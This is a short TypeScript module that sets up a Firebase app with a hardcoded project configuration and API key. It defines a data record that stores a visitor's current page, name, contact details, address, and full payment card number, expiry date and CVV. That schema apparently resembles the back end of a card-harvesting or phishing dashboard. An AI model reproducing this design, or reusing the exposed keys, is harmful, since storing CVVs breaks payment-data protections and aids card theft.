import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';

const firebaseConfig = {
    // Your Firebase configuration will be injected here
    apiKey: "AIzaSyCGXGWc8wON-OL0mEi2vX_B5K7PytlHjfw",
    authDomain: "ah-moror.firebaseapp.com",
    projectId: "ah-moror",
    storageBucket: "ah-moror.firebasestorage.app",
    messagingSenderId: "869838548515",
    appId: "1:869838548515:web:9d1bb5c87d96d2f2d74b96",
    measurementId: "G-4VGVLNQK1L"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

